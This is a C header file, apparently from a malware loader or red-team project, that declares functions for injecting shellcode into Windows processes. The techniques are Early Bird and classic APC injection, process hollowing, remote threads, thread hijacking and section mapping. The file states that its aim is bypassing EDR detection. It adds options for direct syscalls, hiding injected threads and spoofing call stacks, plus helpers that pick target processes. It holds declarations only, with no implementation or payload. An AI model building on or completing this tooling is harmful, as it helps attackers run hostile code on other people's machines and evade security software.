#pragma once

/*
 * Injector.h - Process Injection Techniques
 *
 * Provides multiple process injection techniques for executing
 * shellcode in target processes while bypassing EDR detection.
 */

#include <windows.h>
#include "ProcLoader.h"
#include "ApiLoader.h"
#include "StringCrypt.h"

// Injection method types
typedef enum _INJECTION_METHOD {
    INJECTION_METHOD_EARLY_BIRD = 0,    // APC injection in suspended process
    INJECTION_METHOD_APC = 1,            // Classic APC injection
    INJECTION_METHOD_PROCESS_HOLLOW = 2, // Process hollowing
    INJECTION_METHOD_CREATE_THREAD = 3,  // CreateRemoteThread
    INJECTION_METHOD_THREAD_HIJACK = 4,  // Thread hijacking
    INJECTION_METHOD_SECTION = 5         // Section-based injection
} INJECTION_METHOD;

// Injection configuration
typedef struct _INJECTION_CONFIG {
    DWORD targetPid;              // Target process ID
    LPCWSTR targetPath;           // Path for new process creation
    LPVOID shellcode;             // Shellcode buffer
    SIZE_T shellcodeSize;         // Shellcode size
    INJECTION_METHOD method;      // Injection method
    BOOL useSyscall;              // Use syscalls instead of Win32 API
    BOOL hideThread;              // Hide injected thread
    BOOL spoofStack;              // Spoof call stack
} INJECTION_CONFIG, *PINJECTION_CONFIG;

// Injection result
typedef struct _INJECTION_RESULT {
    BOOL success;                 // Injection success
    HANDLE hProcess;              // Handle to target process
    HANDLE hThread;               // Handle to injected thread
    PVOID pInjectedCode;          // Address of injected code
    DWORD threadId;               // Thread ID
    DWORD exitCode;               // Exit code if available
    char errorMsg[256];           // Error message if failed
} INJECTION_RESULT, *PINJECTION_RESULT;

// Function declarations

/**
 * Early Bird injection - inject shellcode via APC in suspended process
 * @param pid Target process ID (0 to create new process)
 * @param shellcode Shellcode buffer
 * @param size Shellcode size
 * @param pResult Output result structure
 * @return TRUE if successful, FALSE otherwise
 */
BOOL EarlyBirdInject(DWORD pid, LPVOID shellcode, SIZE_T size, PINJECTION_RESULT pResult);

/**
 * Early Bird injection with custom target process
 * @param targetPath Path to target executable
 * @param shellcode Shellcode buffer
 * @param size Shellcode size
 * @param pResult Output result
 * @return TRUE if successful, FALSE otherwise
 */
BOOL EarlyBirdInjectCreateProcess(LPCWSTR targetPath, LPVOID shellcode, SIZE_T size, PINJECTION_RESULT pResult);

/**
 * APC injection into existing thread
 * @param hThread Handle to thread
 * @param shellcode Shellcode buffer
 * @param size Shellcode size
 * @param pResult Output result
 * @return TRUE if successful, FALSE otherwise
 */
BOOL ApcInject(HANDLE hThread, LPVOID shellcode, SIZE_T size, PINJECTION_RESULT pResult);

/**
 * Process Hollowing injection
 * @param targetPath Path to target executable
 * @param shellcode Shellcode buffer
 * @param size Shellcode size
 * @param pResult Output result
 * @return TRUE if successful, FALSE otherwise
 */
BOOL ProcessHollow(LPCWSTR targetPath, LPVOID shellcode, SIZE_T size, PINJECTION_RESULT pResult);

/**
 * CreateRemoteThread injection
 * @param pid Target process ID
 * @param shellcode Shellcode buffer
 * @param size Shellcode size
 * @param pResult Output result
 * @return TRUE if successful, FALSE otherwise
 */
BOOL CreateRemoteThreadInject(DWORD pid, LPVOID shellcode, SIZE_T size, PINJECTION_RESULT pResult);

/**
 * Thread hijacking injection
 * @param pid Target process ID
 * @param shellcode Shellcode buffer
 * @param size Shellcode size
 * @param pResult Output result
 * @return TRUE if successful, FALSE otherwise
 */
BOOL ThreadHijackInject(DWORD pid, LPVOID shellcode, SIZE_T size, PINJECTION_RESULT pResult);

/**
 * Section-based injection (MapViewOfFile)
 * @param pid Target process ID
 * @param shellcode Shellcode buffer
 * @param size Shellcode size
 * @param pResult Output result
 * @return TRUE if successful, FALSE otherwise
 */
BOOL SectionInject(DWORD pid, LPVOID shellcode, SIZE_T size, PINJECTION_RESULT pResult);

/**
 * Generic injection using configuration
 * @param pConfig Injection configuration
 * @param pResult Output result
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InjectShellcode(PINJECTION_CONFIG pConfig, PINJECTION_RESULT pResult);

/**
 * Allocate memory in target process
 * @param hProcess Target process handle
 * @param size Size to allocate
 * @param protect Memory protection
 * @param useSyscall Use syscall instead of Win32
 * @return Allocated memory address or NULL
 */
PVOID InjectVirtualAlloc(HANDLE hProcess, SIZE_T size, DWORD protect, BOOL useSyscall);

/**
 * Write memory to target process
 * @param hProcess Target process handle
 * @param address Target address
 * @param buffer Buffer to write
 * @param size Size to write
 * @param useSyscall Use syscall instead of Win32
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InjectWriteMemory(HANDLE hProcess, PVOID address, LPVOID buffer, SIZE_T size, BOOL useSyscall);

/**
 * Queue APC in target thread
 * @param hThread Target thread handle
 * @param pFunc Function pointer (shellcode address)
 * @param param Parameter to pass
 * @param useSyscall Use syscall instead of Win32
 * @return TRUE if successful, FALSE otherwise
 */
BOOL InjectQueueApc(HANDLE hThread, PVOID pFunc, PVOID param, BOOL useSyscall);

/**
 * Hide injected thread from EDR
 * @param hThread Thread handle
 * @return TRUE if successful, FALSE otherwise
 */
BOOL HideInjectedThread(HANDLE hThread);

/**
 * Cleanup injection resources
 * @param pResult Injection result to cleanup
 */
void CleanupInjectionResult(PINJECTION_RESULT pResult);

/**
 * Get common injection target processes
 * @return Array of process names suitable for injection
 */
const WCHAR** GetCommonInjectionTargets();

/**
 * Find suitable target process for injection
 * @param processName Process name to find (optional)
 * @return Process ID if found, 0 otherwise
 */
DWORD FindInjectionTarget(LPCWSTR processName);